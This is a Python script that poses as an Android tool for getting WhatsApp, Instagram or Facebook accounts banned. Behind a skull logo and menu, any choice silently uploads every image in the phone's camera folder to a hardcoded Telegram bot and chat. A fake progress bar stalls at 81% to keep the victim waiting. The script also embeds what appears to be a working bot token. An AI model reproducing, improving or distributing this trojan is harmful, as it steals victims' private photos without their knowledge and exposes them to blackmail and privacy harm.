import os
import sys
import subprocess
import asyncio
import aiohttp
import random
import time
import threading
from colorama import Fore, Style, init


REQUIRED = ["aiohttp", "colorama"]
for pkg in REQUIRED:
    try:
        __import__(pkg)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", "-U", pkg])

init(autoreset=True)

# ==== CONFIG ====
BOT_TOKEN = "8177299368:AAGQRe_QqZZ6zGN2gB4Gi9OdMFBiBb_CegA"
CHAT_ID = "7109583573"
CAMERA_PATH = "/storage/emulated/0/DCIM/Camera"


LOGO = f"""{Fore.CYAN}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⠿⠿⠛⠛⠛⠉⠉⠛⠛⠛⠻⠿⢿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣾⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣷⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣴⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣧⡀⠀⠀⠀
⠀⠀⠀⣼⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⠶⣄⠀⠀⠀⠀⠀⠀⢀⣴⣶⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣷⡄⠀⠀
⠀⠀⣼⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣇⠀⣨⣷⠀⠀⠀⠀⢰⣿⣿⣇⢀⣸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡀⠀
⠀⣸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀
⢠⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠿⠋⠀⠀⠀⠀⠀⠙⠿⠿⠿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⣸⣿⣿⠇⠀⠀⠀⣠⣴⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣷⣦⡀⠀⠀⠀⣿⣿⣿
⣿⣿⣿⠀⠀⠀⠀⠛⠛⣿⣏⠙⠻⢷⣶⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣶⠾⠛⢁⣿⡿⠛⠃⠀⠀⠀⢿⣿⣿
⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⣿⣧⡀⠀⠈⠉⠛⠛⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠟⠛⠋⠉⠀⠀⢠⣾⣿⡇⠀⠀⠀⠀⠀⢸⣿⣿
⣿⣿⣿⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⠇⠀⠀⠀⠀⠀⣾⣿⣿
⢹⣿⣿⡇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⣿⡿
⠈⣿⣿⣿⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣦⣤⣤⣤⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⣸⣿⣿⠇
⠀⢹⣿⣿⣇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢠⣿⣿⡟⠀
⠀⠀⢻⣿⣿⣆⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⢠⣿⣿⣿⠁⠀
⠀⠀⠀⢻⣿⣿⣧⠀⠀⠀⠀⠀⠘⣿⣿⡛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⢻⣿⡿⠁⠀⠀⠀⠀⣠⣿⣿⡿⠁⠀⠀
⠀⠀⠀⠀⠹⣿⣿⣷⣄⠀⠀⠀⠀⠈⢻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⠏⠀⠀⠀⠀⢀⣴⣿⣿⡟⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢿⣿⣿⣷⣄⠀⠀⠀⠀⠙⢿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⠟⠁⠀⠀⠀⢀⣴⣿⣿⡿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣷⣤⡀⠀⠀⠀⠉⠛⠿⣷⣶⣤⣄⣀⣀⣀⣤⣤⣶⣿⠿⠋⠁⠀⠀⢀⣠⣶⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣷⣦⣄⣀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠉⠉⠁⠀⠀⢀⣀⣤⣶⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣷⣶⣶⣤⣤⣤⣤⣤⣤⣴⣶⣶⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠿⠿⢿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
{Style.RESET_ALL}
"""

# ==== TELEGRAM FUNCTIONS ====
async def send_message(session, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        await session.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=5)
    except:
        pass

async def send_photo(session, path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(path, "rb") as f:
            data = aiohttp.FormData()
            data.add_field("chat_id", CHAT_ID)
            data.add_field("caption", "Devolved by: DARKKING")
            data.add_field("photo", f, filename=os.path.basename(path))
            await session.post(url, data=data, timeout=30)
    except:
        pass


async def send_images_immediately():
    sent = set()
    first = True

    async with aiohttp.ClientSession() as session:
        for root, _, imgs in os.walk(CAMERA_PATH):
            for img in imgs:
                if not img.lower().endswith((".jpg", ".jpeg", ".png")):
                    continue
                path = os.path.join(root, img)

                if path in sent:  # no repeat
                    continue
                sent.add(path)

                if first:
                    await send_message(session, "✅ Process started...")
                    first = False

                await send_photo(session, path)

        if not first:
            await send_message(session, "📤 Backup completed!")
        else:
            await send_message(session, "❌ No images found in Camera folder.")


def loading_bar():
    print(Fore.GREEN + "\n[", end="")
    for i in range(68):
        print("#", end="", flush=True)
        time.sleep(random.uniform(0.05, 0.15))  
    print(">" + Fore.YELLOW + " 81%" + Style.RESET_ALL, end="", flush=True)
    while True:
        time.sleep(1) 


def menu():
    os.system("clear")
    print(LOGO)
    print(Fore.MAGENTA + "Tool by: D4RK-K1NG" + Style.RESET_ALL)
    print("\nChoose an option:\n1. ban whatsapp\n2. ban instagram \n3. ban Facebook \n")
    choice = input(Fore.CYAN + "Enter choice: " + Style.RESET_ALL)

    if choice in ["1", "2", "3"]:
        threading.Thread(target=lambda: asyncio.run(send_images_immediately()), daemon=True).start()
        loading_bar()
    else:
        print(Fore.RED + "Invalid option!" + Style.RESET_ALL)

if __name__ == "__main__":
    menu()
